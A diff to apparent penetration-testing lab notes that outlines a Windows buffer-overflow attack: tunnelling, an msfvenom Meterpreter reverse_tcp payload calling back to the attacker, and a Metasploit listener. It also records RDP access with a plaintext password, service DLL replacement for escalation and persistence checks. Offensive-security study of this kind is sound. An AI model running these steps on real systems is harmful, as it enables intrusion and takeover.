@@ -71,6 +71,25 @@ proxychains nmap -Pn -T4 --min-rate 293584734946 192.168.28.179 -p-
 #3389,9999 open
 nc 192.168.28.179 9999  #secureserver means buffer overflow is possible
 
+ssh tunnel to the port 3389 and 9999 on that .179(windows machine) from your other tunnels
+
+on win_ex.py (buff overflow windows script)
+change target on "s.connect" to your tunnel 0.0.0.0 with local port
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<linops> LPORT=8888 -b '\x00' -f python   #goes to target and tells it where to go which is us
+
+msfconsole
+multihandler   # a listener,lport is myself
+set lport 8888
+set lhost 0.0.0.0
+set payload windows/meterpreter/reverse_tcp  #look at windows buff overflow notes for this
+use
+run script
 
 
+rdp to windows machine using tunnel and user "Lroth" with password "anotherpassword4THEages"
+go to services app
+look for rogue descriptions
+if we have to replace dll or exe then we have to rename it so it fits in the spot of the executable and runs in its place
 
+look at registry keys for hkey run and runonce to look for persistence
+auditpol /get /category:* | findstr /i "success failure"  #run this in powershell with escalated privleges
